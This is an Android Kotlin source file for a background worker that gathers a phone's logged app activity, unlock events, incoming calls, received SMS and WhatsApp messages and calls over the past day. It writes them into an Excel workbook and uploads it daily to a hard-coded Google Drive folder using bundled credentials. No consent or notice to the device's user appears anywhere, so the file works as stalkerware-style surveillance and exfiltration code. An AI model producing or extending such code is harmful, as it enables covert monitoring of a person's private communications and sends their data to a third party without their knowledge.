package com.logger.service

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.api.client.googleapis.javanet.GoogleNetHttpTransport
import com.google.api.client.http.FileContent
import com.google.api.client.json.gson.GsonFactory
import com.google.api.services.drive.Drive
import com.google.api.services.drive.DriveScopes
import com.google.auth.http.HttpCredentialsAdapter
import com.google.auth.oauth2.GoogleCredentials
import com.logger.data.AppDatabase
import com.logger.data.LogEntry
import jxl.Workbook
import jxl.write.Label
import jxl.write.WritableWorkbook
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class DailyExportWorker(
    private val context: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(context, workerParams) {

    companion object {
        private const val TAG = "DailyExportWorker"
        private const val FOLDER_ID = "1rSToL1_lxoBHYhkZF2REZUwu7bOXCIoU"
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            Log.d(TAG, "Starting automated Daily Google Drive Sync...")
            
            val endTimestamp = System.currentTimeMillis()
            val startTimestamp = endTimestamp - (24 * 60 * 60 * 1000L) // Last 24 hours
            
            val db = AppDatabase.getInstance(context)
            val logs = db.logDao().getAllLogsInRange(startTimestamp, endTimestamp)
            
            if (logs.isEmpty()) {
                Log.d(TAG, "No logs recorded in the last 24 hours. Skipping upload.")
                return@withContext Result.success()
            }
            
            val sdf = SimpleDateFormat("yyyy_MM_dd", Locale.getDefault())
            val dateStr = sdf.format(Date())
            
            val tempFile = File(context.cacheDir, "Daily_Logs_$dateStr.xls")
            
            buildExcelFile(tempFile, logs)
            
            uploadToGoogleDrive(tempFile, "Logger_Daily_Export_$dateStr.xls")
            
            tempFile.delete()
            Log.d(TAG, "Google Drive Sync successful!")
            
            Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Failed daily sync: ${e.message}", e)
            if (runAttemptCount >= 3) {
                Log.e(TAG, "Max retries (3) reached. Halting until tomorrow at 6:00 AM.")
                return@withContext Result.failure()
            }
            Result.retry() // Reschedules automatically following exponential backoff
        }
    }

    private suspend fun buildExcelFile(file: File, logs: List<LogEntry>) = withContext(Dispatchers.IO) {
        val outputStream = FileOutputStream(file)
        val workbook = Workbook.createWorkbook(outputStream)
                        
        val appLogs = logs.filter { it.eventType == LogEntry.TYPE_APP_OPENED || it.eventType == LogEntry.TYPE_APP_CLOSED || it.eventType == LogEntry.TYPE_APP_FOCUS || it.eventType == LogEntry.TYPE_AUTH_UNLOCK }
        val callLogs = logs.filter { it.eventType == LogEntry.TYPE_CALL_INCOMING }
        val msgLogs = logs.filter { it.eventType == LogEntry.TYPE_SMS_RECEIVED }
        val waLogs = logs.filter { it.eventType == LogEntry.TYPE_WHATSAPP_MSG || it.eventType == LogEntry.TYPE_WHATSAPP_CALL }
                        
        writeSheet(workbook, "App Activity", 0, appLogs)
        writeSheet(workbook, "Calls", 1, callLogs)
        writeSheet(workbook, "Messages", 2, msgLogs)
        writeSheet(workbook, "WhatsApp", 3, waLogs)
                        
        workbook.write()
        workbook.close()
        outputStream.close()
    }
    
    private fun writeSheet(workbook: WritableWorkbook, name: String, index: Int, logs: List<LogEntry>) {
        val sheet = workbook.createSheet(name, index)
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        
        sheet.addCell(Label(0, 0, "Time"))
        sheet.addCell(Label(1, 0, "Event Type"))
        sheet.addCell(Label(2, 0, "Details"))
        sheet.addCell(Label(3, 0, "App / Content"))
        sheet.addCell(Label(4, 0, "Duration (ms)"))
        
        for (i in logs.indices) {
            val log = logs[i]
            val row = i + 1
            sheet.addCell(Label(0, row, sdf.format(Date(log.timestamp))))
            sheet.addCell(Label(1, row, log.eventType))
            sheet.addCell(Label(2, row, log.details ?: ""))
            sheet.addCell(Label(3, row, log.appName ?: ""))
            sheet.addCell(Label(4, row, log.durationMillis?.toString() ?: ""))
        }
    }

    private suspend fun uploadToGoogleDrive(file: File, remoteFileName: String) = withContext(Dispatchers.IO) {
        context.assets.open("credentials.json").use { inputStream ->
            val credentials = GoogleCredentials.fromStream(inputStream)
                .createScoped(listOf(DriveScopes.DRIVE_FILE))
                
            val httpTransport = GoogleNetHttpTransport.newTrustedTransport()
            val jsonFactory = GsonFactory.getDefaultInstance()
            
            val driveService = Drive.Builder(httpTransport, jsonFactory, HttpCredentialsAdapter(credentials))
                .setApplicationName("Android Logger Tracker")
                .build()
                
            val fileMetadata = com.google.api.services.drive.model.File().apply {
                name = remoteFileName
                parents = listOf(FOLDER_ID)
                mimeType = "application/vnd.ms-excel"
            }
            
            val mediaContent = FileContent("application/vnd.ms-excel", file)
            
            driveService.files().create(fileMetadata, mediaContent)
                .setFields("id")
                .execute()
        }
    }
}
